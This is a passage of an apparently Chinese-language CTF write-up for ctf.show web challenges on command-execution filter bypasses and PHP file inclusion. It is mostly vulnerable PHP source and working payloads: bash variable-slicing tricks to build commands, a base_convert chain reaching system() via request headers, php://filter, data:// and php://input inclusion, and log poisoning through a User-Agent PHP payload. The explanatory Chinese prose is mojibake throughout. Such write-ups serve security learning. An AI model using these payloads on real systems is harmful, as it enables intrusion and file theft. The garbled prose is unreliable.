$&#123;PATH:~A&#125;                </span><br><span class="line">n                                                                                    </span><br><span class="line"># $&#123;PATH:~A&#125;l flag.txt</span><br><span class="line">     1  flag&#123;test&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç¯å¢ƒä¸­åº”è¯¥æœ‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure><p>æ•…å¯ä»¥æ„é€ å‡º<code>nl</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure><h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p><code>PATH</code>è¢«<code>ban</code>äº†ï¼Œå°è¯•æ„é€ å‡º<code>/bin/cat</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo $&#123;#&#125;   </span><br><span class="line">0</span><br><span class="line"># echo $&#123;SHLVL&#125;</span><br><span class="line">1</span><br><span class="line"># echo $&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;</span><br><span class="line">/</span><br><span class="line"># echo $&#123;USER&#125;</span><br><span class="line">www-data</span><br><span class="line"># echo $&#123;PHP_VERSION&#125;</span><br><span class="line">7.3.22</span><br><span class="line"># echo $&#123;PHP_VERSION:~A&#125;</span><br><span class="line">2</span><br><span class="line"># echo $&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;</span><br><span class="line">at</span><br><span class="line"># $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># æ­¤å¤„å‘½ä»¤å³ä¸º /???/?at ????.???</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h3 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¼©çŸ­ä¸Šé¢˜<code>payload</code>é•¿åº¦ï¼Œæ‰§è¡ŒåæŸ¥çœ‹æºç å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><h3 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨<code>PWD</code>æ„é€ <code>/bin/rev</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo $&#123;#IFS&#125;</span><br><span class="line">3 #kaliä¸­ä¸º4</span><br><span class="line"># echo $&#123;#&#125;</span><br><span class="line">0</span><br><span class="line"># echo $&#123;##&#125;</span><br><span class="line">1</span><br><span class="line"># echo $&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br><span class="line"># echo $&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒåæŸ¥çœ‹æºç ç„¶ååè¿‡æ¥å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><h3 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>PWD</code> å’Œ<code>#</code>éƒ½è¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>HOME</code>å’Œ<code>$?</code>æ¥æ„é€ å‡º<code>/bin/base64</code></p><blockquote><p><code>$?</code> æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ï¼ˆè¿”å›å€¼ï¼‰å³æ‰§è¡Œä¸Šä¸€ä¸ªæŒ‡ä»¤çš„è¿”å›å€¼ (æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;A</code>ä¼šè¿”å›<code>1</code></p></blockquote><p><code>4</code>å¯ä»¥é€šè¿‡<code>$&#123;RANDOM&#125;</code>æ¥æ„é€ ï¼Œæ•…å¯ä»¥å¾—åˆ°<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(base64.b64encode(&#x27;&lt;?php&#x27;.encode()))</span></span><br><span class="line">url = <span class="string">&#x27;http://ba6d9714-de63-45f5-9fa8-dcf064bad709.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>:<span class="string">&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;PD9waHA&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ å‡º<code>getallheaders</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>, <span class="number">36</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;getallheaders&#x27;</span>, <span class="number">30</span>, <span class="number">10</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">header:</span><br><span class="line">1=tac flag.php</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨dataåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=data://text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨phpå¤§å°å†™ç»•è¿‡</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>cfa720bd-94a9-49c3-a122-6a2829e75f7f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://cfa720bd-94a9-49c3-a122-6a2829e75f7f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://cfa720bd-94a9-49c3-a122-6a2829e75f7f.challenge.ctf.show/?file=Php://input</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•ä¸€-å¤§å°å†™ç»•è¿‡"><a href="#æ–¹æ³•ä¸€-å¤§å°å†™ç»•è¿‡" class="headerlink" title="æ–¹æ³•ä¸€ å¤§å°å†™ç»•è¿‡"></a>æ–¹æ³•ä¸€ å¤§å°å†™ç»•è¿‡</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2ee07c4d-509b-44c0-a5cc-24b98c68c3fc.challenge.ctf.show</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2ee07c4d-509b-44c0-a5cc-24b98c68c3fc.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.2.1002087790.1668386541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl0g.php&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒ-åŒ…å«æ—¥å¿—æ–‡ä»¶"><a href="#æ–¹æ³•äºŒ-åŒ…å«æ—¥å¿—æ–‡ä»¶" class="headerlink" title="æ–¹æ³•äºŒ åŒ…å«æ—¥å¿—æ–‡ä»¶"></a>æ–¹æ³•äºŒ åŒ…å«æ—¥å¿—æ–‡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">/?file=/var/log/nginx/access.log</span><br><span class="line">User-Agent:&lt;?php system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="web81"><a href="#web81" class="headerlink" 